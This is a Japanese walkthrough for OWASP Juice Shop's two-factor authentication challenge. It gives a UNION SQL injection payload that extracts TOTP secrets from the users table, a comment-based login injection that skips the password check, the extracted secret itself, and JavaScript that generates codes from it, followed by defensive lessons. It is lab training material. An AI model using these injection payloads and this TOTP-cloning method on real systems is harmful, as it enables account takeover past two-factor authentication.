# Two Factor Authentication ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** 認証
**目標:** wurstbrotの2要素認証を突破してログインする

---

## 思考プロセス

**ステップ1: 2FAの仕組みを理解**
```
「2FAはパスワードに加えて、時間ベースのコードが必要」
    ↓
「TOTP（Time-based One-Time Password）が使われている」
    ↓
「Google Authenticatorなどのアプリで6桁のコードを生成」
    ↓
「コードは30秒ごとに変わる」
```

**ステップ2: TOTPの生成原理**
```
「TOTPは秘密鍵（シークレット）と現在時刻から計算される」
    ↓
「シークレットを知っていれば、誰でも同じコードを生成できる」
    ↓
「シークレットがデータベースに保存されているはず」
    ↓
「SQLiでシークレットを抽出できれば...!」
```

## 実行手順

**ステップ1: SQLiでTOTPシークレットを取得**

検索バーに入力:
```
')) UNION SELECT id,email,password,totpsecret,5,6,7,8,9 FROM users--
```
wurstbrot のシークレット: `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH`

**ステップ2: TOTPコードを生成**

Google Authenticator などのアプリを使う方法：
1. アプリを開く
2. 「手動入力」を選択
3. シークレットキー `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH` を入力
4. 表示される6桁のコードを使用

**ステップ3: ログイン**
1. メール: `wurstbrot@juice-sh.op'--` （SQLiでパスワードスキップ）
2. パスワード: 何でもOK
3. 2FA画面で、生成された6桁コードを入力

## コード/ペイロード

```javascript
// ブラウザでTOTPコード計算
function base32Decode(str) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  for (const char of str.toUpperCase()) {
    const val = alphabet.indexOf(char);
    if (val >= 0) bits += val.toString(2).padStart(5, '0');
  }
  const bytes = new Uint8Array(Math.floor(bits.length / 8));
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(bits.substr(i * 8, 8), 2);
  }
  return bytes;
}

async function generateTOTP(secret) {
  const key = base32Decode(secret);
  const counter = Math.floor(Date.now() / 30000);
  const counterBytes = new Uint8Array(8);
  let temp = counter;
  for (let i = 7; i >= 0; i--) {
    counterBytes[i] = temp & 0xff;
    temp = Math.floor(temp / 256);
  }
  const cryptoKey = await crypto.subtle.importKey('raw', key, {name: 'HMAC', hash: 'SHA-1'}, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', cryptoKey, counterBytes);
  const hash = new Uint8Array(sig);
  const offset = hash[19] & 0xf;
  const code = ((hash[offset] & 0x7f) << 24 | hash[offset+1] << 16 | hash[offset+2] << 8 | hash[offset+3]) % 1000000;
  return code.toString().padStart(6, '0');
}

// 使用
const totp = await generateTOTP('IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH');
console.log(totp);
```

## 解説

**なぜ2FAが突破できる？**
- TOTPシークレットがデータベースに保存されている
- SQLiでシークレットを抽出可能
- シークレットがあれば誰でもTOTPコードを生成できる

**教訓:**
- 2FAのシークレットも重要な機密情報
- SQLi対策が最重要
- シークレットの暗号化保存を検討

## 関連チャレンジ

- [Database Schema](../difficulty-4/database-schema.md)
- [User Credentials](../difficulty-4/user-credentials.md)
